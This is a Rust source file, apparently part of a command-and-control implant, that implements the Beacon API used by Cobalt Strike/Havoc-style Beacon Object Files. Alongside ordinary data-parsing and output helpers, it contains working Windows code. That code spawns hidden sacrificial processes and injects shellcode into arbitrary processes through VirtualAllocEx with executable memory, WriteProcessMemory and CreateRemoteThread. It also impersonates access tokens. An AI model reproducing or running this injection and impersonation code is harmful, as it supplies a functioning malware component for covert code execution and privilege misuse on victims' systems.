//! Beacon API functions callable by BOF (Beacon Object File) object code.
//!
//! These `extern "C"` functions are called directly by BOF object code via
//! the function-pointer map (FunMap).  Each matches the signature declared in
//! Cobalt Strike / Havoc `beacon.h`.
//!
//! Extracted from `coffeeldr.rs`.

use crate::bof_context::{BOF_CONTEXT_TLS, BOF_OUTPUT_TLS, DataParser};

// ── Beacon data-parsing API ────────────────────────────────────────────────

/// `void BeaconDataParse(datap *parser, char *buffer, int size)`
///
/// Initialises a [`DataParser`].  The first 4 bytes of `buffer` are a
/// length prefix consumed here; the usable data starts at offset 4.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_data_parse(
    parser: *mut DataParser,
    buffer: *const u8,
    size: i32,
) {
    if parser.is_null() || buffer.is_null() {
        return;
    }
    // SAFETY: caller guarantees `parser` is valid and writable.
    let p = unsafe { &mut *parser };
    p.original = buffer;
    p.buffer = unsafe { buffer.add(4) };
    p.length = size - 4;
    p.size = size - 4;
}

/// `int BeaconDataInt(datap *parser)`
///
/// Reads a little-endian 32-bit integer and advances the cursor.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_data_int(parser: *mut DataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    let p = unsafe { &mut *parser };
    if p.length < 4 {
        return 0;
    }
    // SAFETY: caller guarantees at least `p.length` readable bytes at `p.buffer`.
    let value = unsafe { std::ptr::read_unaligned(p.buffer.cast::<u32>()) };
    p.buffer = unsafe { p.buffer.add(4) };
    p.length -= 4;
    value as i32
}

/// `short BeaconDataShort(datap *parser)`
///
/// Reads a little-endian 16-bit integer and advances the cursor.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_data_short(parser: *mut DataParser) -> i16 {
    if parser.is_null() {
        return 0;
    }
    let p = unsafe { &mut *parser };
    if p.length < 2 {
        return 0;
    }
    let value = unsafe { std::ptr::read_unaligned(p.buffer.cast::<u16>()) };
    p.buffer = unsafe { p.buffer.add(2) };
    p.length -= 2;
    value as i16
}

/// `char *BeaconDataExtract(datap *parser, int *size)`
///
/// Reads a 4-byte length prefix followed by that many bytes of data.
/// Returns a pointer to the data (inside the original buffer) and
/// optionally writes the length to `*size`.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_data_extract(
    parser: *mut DataParser,
    size_out: *mut i32,
) -> *const u8 {
    if parser.is_null() {
        return std::ptr::null();
    }
    let p = unsafe { &mut *parser };
    if p.length < 4 {
        return std::ptr::null();
    }
    let length = unsafe { std::ptr::read_unaligned(p.buffer.cast::<u32>()) } as i32;
    // Defensive check: reject negative or overlong length prefixes.
    if length < 0 || length > p.length - 4 {
        return std::ptr::null();
    }
    p.buffer = unsafe { p.buffer.add(4) };
    let data = p.buffer;
    p.length -= 4;
    p.length -= length;
    p.buffer = unsafe { p.buffer.add(length as usize) };
    if !size_out.is_null() {
        unsafe { *size_out = length };
    }
    data
}

/// `int BeaconDataLength(datap *parser)`
///
/// Returns the number of bytes remaining in the parser.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_data_length(parser: *mut DataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    unsafe { (*parser).length }
}

// ── Beacon output API ──────────────────────────────────────────────────────

/// `void BeaconOutput(int type, char *data, int len)`
///
/// Appends raw bytes to the BOF output buffer.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_output(_cb_type: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    let slice = unsafe { std::slice::from_raw_parts(data, len as usize) };
    BOF_OUTPUT_TLS.with(|cell| {
        let ptr = cell.get();
        if !ptr.is_null() {
            // SAFETY: ptr is set by coffee_execute to a valid &mut Vec<u8>.
            unsafe { (*ptr).extend_from_slice(slice) };
        }
    });
}

// The actual `BeaconPrintf` entry point is implemented in C
// (`csrc/bof_printf.c`) because Rust stable does not support defining
// C-variadic functions.  The C shim calls `vsnprintf` and then invokes
// `bof_printf_callback` below to append the formatted result to the
// thread-local BOF output buffer.
//
// The symbol `bof_beacon_printf` is resolved by the COFF loader in
// `resolve_beacon_api` when a BOF imports `BeaconPrintf`.
#[allow(unsafe_code)]
unsafe extern "C" {
    pub(crate) fn bof_beacon_printf(cb_type: i32, fmt: *const u8, ...);
}

/// Callback invoked from the C `bof_beacon_printf` shim after it has
/// formatted the variadic arguments with `vsnprintf`.
#[allow(unsafe_code)]
#[unsafe(no_mangle)]
pub(crate) unsafe extern "C" fn bof_printf_callback(data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    let slice = unsafe { std::slice::from_raw_parts(data, len as usize) };
    BOF_OUTPUT_TLS.with(|cell| {
        let ptr = cell.get();
        if !ptr.is_null() {
            unsafe { (*ptr).extend_from_slice(slice) };
        }
    });
}

// ── Utility APIs ───────────────────────────────────────────────────────────

/// `BOOL toWideChar(char *src, wchar_t *dst, int max)`
///
/// Converts an ASCII/ANSI string to UTF-16LE in-place.
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn to_wide_char(src: *const u8, dst: *mut u16, max: i32) -> i32 {
    if src.is_null() || dst.is_null() || max <= 0 {
        return 0;
    }
    let max = max as usize;
    for i in 0..max {
        let ch = unsafe { *src.add(i) };
        unsafe { *dst.add(i) = ch as u16 };
        if ch == 0 {
            return 1; // TRUE — success
        }
    }
    1 // TRUE
}

// ── Beacon spawn/inject/token APIs ────────────────────────────────────────
//
// These APIs require Win32 process creation, injection, and token
// management.  On Windows they perform real operations; on non-Windows
// they are safe no-ops that return failure to the BOF.

/// `void BeaconGetSpawnTo(BOOL x86, char *buffer, int length)`
///
/// Copies the configured spawn-to binary path (UTF-16LE) into the
/// caller-supplied buffer.  Reads from the thread-local [`BofContext`].
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_get_spawn_to(x86: i32, buffer: *mut u8, length: i32) {
    if buffer.is_null() || length <= 0 {
        return;
    }
    BOF_CONTEXT_TLS.with(|cell| {
        let ctx = cell.get();
        if ctx.is_null() {
            return;
        }
        // SAFETY: ctx was set by set_bof_context to a valid &BofContext.
        let ctx = unsafe { &*ctx };
        let path = if x86 != 0 { &ctx.spawn32 } else { &ctx.spawn64 };
        if let Some(wide) = path {
            let byte_len = wide.len() * 2;
            if byte_len > length as usize {
                return;
            }
            // SAFETY: caller guarantees buffer has at least `length` bytes.
            unsafe {
                std::ptr::copy_nonoverlapping(wide.as_ptr().cast::<u8>(), buffer, byte_len);
            }
        }
    });
}

/// `BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO *sInfo, PROCESS_INFORMATION *pInfo)`
///
/// Spawns a sacrificial process for injection.  Uses the spawn-to path from
/// the thread-local [`BofContext`] and calls `CreateProcessW`.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_spawn_temporary_process(
    x86: i32,
    _ignore_token: i32,
    si: *mut u8,
    pi: *mut u8,
) -> i32 {
    use windows_sys::Win32::System::Threading::{CREATE_NO_WINDOW, CreateProcessW};

    if si.is_null() || pi.is_null() {
        return 0; // FALSE
    }

    // Read the spawn path from context.
    let mut path: Option<Vec<u16>> = None;
    BOF_CONTEXT_TLS.with(|cell| {
        let ctx = cell.get();
        if ctx.is_null() {
            return;
        }
        let ctx = unsafe { &*ctx };
        path = if x86 != 0 { ctx.spawn32.clone() } else { ctx.spawn64.clone() };
    });

    let Some(mut cmd_line) = path else {
        return 0; // FALSE — no spawn path configured
    };

    // Ensure NUL-terminated.
    if cmd_line.last() != Some(&0) {
        cmd_line.push(0);
    }

    // SAFETY: si and pi point to caller-allocated STARTUPINFOW and
    // PROCESS_INFORMATION structs respectively.  CreateProcessW fills pi.
    let result = unsafe {
        CreateProcessW(
            std::ptr::null(),
            cmd_line.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            1, // bInheritHandles = TRUE
            CREATE_NO_WINDOW,
            std::ptr::null(),
            std::ptr::null(),
            si.cast(),
            pi.cast(),
        )
    };

    if result == 0 { 0 } else { 1 }
}

/// Non-Windows stub for `BeaconSpawnTemporaryProcess`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_spawn_temporary_process(
    _x86: i32,
    _ignore_token: i32,
    _si: *mut u8,
    _pi: *mut u8,
) -> i32 {
    0 // FALSE
}

/// `void BeaconInjectProcess(HANDLE hProc, int pid, char *payload, int p_len, int p_offset, char *arg, int a_len)`
///
/// Injects shellcode into a running process via `VirtualAllocEx` +
/// `WriteProcessMemory` + `CreateRemoteThread`.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_inject_process(
    h_proc: usize,
    pid: i32,
    payload: *const u8,
    p_len: i32,
    p_offset: i32,
    arg: *const u8,
    a_len: i32,
) {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
    };
    use windows_sys::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS,
    };

    if payload.is_null() || p_len <= 0 {
        return;
    }

    let mut close_on_exit = false;
    let handle = if h_proc != 0 {
        h_proc as *mut std::ffi::c_void
    } else {
        if pid <= 0 {
            return;
        }
        close_on_exit = true;
        let h = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid as u32) };
        if h.is_null() {
            return;
        }
        h
    };

    // Allocate and write payload.
    let p_size = p_len as usize;
    let p_remote = unsafe {
        VirtualAllocEx(
            handle,
            std::ptr::null(),
            p_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if p_remote.is_null() {
        if close_on_exit {
            unsafe { CloseHandle(handle) };
        }
        return;
    }

    let mut written: usize = 0;
    let ok = unsafe { WriteProcessMemory(handle, p_remote, payload.cast(), p_size, &mut written) };
    if ok == 0 {
        if close_on_exit {
            unsafe { CloseHandle(handle) };
        }
        return;
    }

    // Allocate and write arguments (if any).
    let mut a_remote: *mut std::ffi::c_void = std::ptr::null_mut();
    if !arg.is_null() && a_len > 0 {
        let a_size = a_len as usize;
        a_remote = unsafe {
            VirtualAllocEx(
                handle,
                std::ptr::null(),
                a_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if !a_remote.is_null() {
            unsafe {
                WriteProcessMemory(handle, a_remote, arg.cast(), a_size, &mut written);
            };
        }
    }

    // Execute payload via CreateRemoteThread.
    let start = unsafe { p_remote.byte_add(p_offset as usize) };
    unsafe {
        CreateRemoteThread(
            handle,
            std::ptr::null(),
            0,
            Some(std::mem::transmute(start)),
            a_remote,
            0,
            std::ptr::null_mut(),
        );
    }

    if close_on_exit {
        unsafe { CloseHandle(handle) };
    }
}

/// Non-Windows stub for `BeaconInjectProcess`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_inject_process(
    _h_proc: usize,
    _pid: i32,
    _payload: *const u8,
    _p_len: i32,
    _p_offset: i32,
    _arg: *const u8,
    _a_len: i32,
) {
}

/// `void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pInfo, char *payload, int p_len, int p_offset, char *arg, int a_len)`
///
/// Injects shellcode into a process created by `BeaconSpawnTemporaryProcess`.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_inject_temporary_process(
    pi: *const u8,
    payload: *const u8,
    p_len: i32,
    p_offset: i32,
    arg: *const u8,
    a_len: i32,
) {
    if pi.is_null() {
        return;
    }
    // PROCESS_INFORMATION layout: hProcess (isize), hThread (isize), dwProcessId (u32), dwThreadId (u32)
    let h_proc = unsafe { std::ptr::read_unaligned(pi.cast::<isize>()) } as usize;
    // Delegate to BeaconInjectProcess with the handle.
    unsafe {
        beacon_inject_process(h_proc, 0, payload, p_len, p_offset, arg, a_len);
    }
}

/// Non-Windows stub for `BeaconInjectTemporaryProcess`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_inject_temporary_process(
    _pi: *const u8,
    _payload: *const u8,
    _p_len: i32,
    _p_offset: i32,
    _arg: *const u8,
    _a_len: i32,
) {
}

/// `void BeaconCleanupProcess(PROCESS_INFORMATION *pInfo)`
///
/// Closes the process and thread handles in a `PROCESS_INFORMATION` struct.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_cleanup_process(pi: *mut u8) {
    use windows_sys::Win32::Foundation::CloseHandle;

    if pi.is_null() {
        return;
    }
    // PROCESS_INFORMATION: { hProcess: HANDLE, hThread: HANDLE, ... }
    let h_process = unsafe { std::ptr::read_unaligned(pi.cast::<*mut std::ffi::c_void>()) };
    let h_thread = unsafe {
        std::ptr::read_unaligned(
            pi.add(std::mem::size_of::<*mut std::ffi::c_void>()).cast::<*mut std::ffi::c_void>(),
        )
    };

    if !h_process.is_null() {
        unsafe { CloseHandle(h_process) };
    }
    if !h_thread.is_null() {
        unsafe { CloseHandle(h_thread) };
    }
}

/// Non-Windows stub for `BeaconCleanupProcess`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_cleanup_process(_pi: *mut u8) {}

/// `BOOL BeaconIsAdmin(void)`
///
/// Returns `TRUE` (1) if the current process token is elevated.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_is_admin() -> i32 {
    use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
    use windows_sys::Win32::Security::{GetTokenInformation, TOKEN_ELEVATION, TokenElevation};
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    let mut token: *mut std::ffi::c_void = std::ptr::null_mut();
    // TOKEN_QUERY = 0x0008
    let ok = unsafe { OpenProcessToken(GetCurrentProcess(), 0x0008, &mut token) };
    if ok == FALSE {
        return 0;
    }

    let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut ret_len: u32 = 0;
    let ok = unsafe {
        GetTokenInformation(
            token,
            TokenElevation,
            (&raw mut elevation).cast(),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len,
        )
    };

    unsafe { CloseHandle(token) };

    if ok == FALSE {
        return 0;
    }

    if elevation.TokenIsElevated != 0 { 1 } else { 0 }
}

/// Non-Windows stub for `BeaconIsAdmin`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_is_admin() -> i32 {
    0 // FALSE
}

/// `BOOL BeaconUseToken(HANDLE token)`
///
/// Duplicates the given token and impersonates it on the current thread.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_use_token(token: usize) -> i32 {
    use windows_sys::Win32::Foundation::FALSE;
    use windows_sys::Win32::System::Threading::SetThreadToken;

    // SetThreadToken(NULL, token) impersonates the token on the calling thread.
    let ok = unsafe { SetThreadToken(std::ptr::null(), token as *mut std::ffi::c_void) };
    if ok == FALSE { 0 } else { 1 }
}

/// Non-Windows stub for `BeaconUseToken`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_use_token(_token: usize) -> i32 {
    0 // FALSE
}

/// `void BeaconRevertToken(void)`
///
/// Reverts the current thread to its original process token.
#[cfg(windows)]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_revert_token() {
    use windows_sys::Win32::Security::RevertToSelf;
    unsafe { RevertToSelf() };
}

/// Non-Windows stub for `BeaconRevertToken`.
#[cfg(not(windows))]
#[allow(dead_code, unsafe_code)]
pub(crate) unsafe extern "C" fn beacon_revert_token() {}

/// Resolve a `__imp_Beacon*` or `__imp_toWideChar` symbol name to the
/// corresponding Beacon API function pointer, or `None` if the name is not
/// a known Beacon API.
#[allow(dead_code)]
pub(crate) fn resolve_beacon_api(sym_name: &str) -> Option<u64> {
    // Strip the `__imp_` prefix to get the bare function name.
    let bare = sym_name.strip_prefix("__imp_")?;
    let addr: u64 = match bare {
        // Data-parsing APIs
        "BeaconDataParse" => beacon_data_parse as *const () as u64,
        "BeaconDataInt" => beacon_data_int as *const () as u64,
        "BeaconDataShort" => beacon_data_short as *const () as u64,
        "BeaconDataExtract" => beacon_data_extract as *const () as u64,
        "BeaconDataLength" => beacon_data_length as *const () as u64,
        // Output APIs
        "BeaconOutput" => beacon_output as *const () as u64,
        "BeaconPrintf" => bof_beacon_printf as *const () as u64,
        // Spawn/inject APIs
        "BeaconGetSpawnTo" => beacon_get_spawn_to as *const () as u64,
        "BeaconSpawnTemporaryProcess" => beacon_spawn_temporary_process as *const () as u64,
        "BeaconInjectProcess" => beacon_inject_process as *const () as u64,
        "BeaconInjectTemporaryProcess" => beacon_inject_temporary_process as *const () as u64,
        "BeaconCleanupProcess" => beacon_cleanup_process as *const () as u64,
        // Token APIs
        "BeaconIsAdmin" => beacon_is_admin as *const () as u64,
        "BeaconUseToken" => beacon_use_token as *const () as u64,
        "BeaconRevertToken" => beacon_revert_token as *const () as u64,
        // Utility APIs
        "toWideChar" => to_wide_char as *const () as u64,
        _ => {
            // Unknown Beacon API — return None so caller can decide.
            return None;
        }
    };
    Some(addr)
}
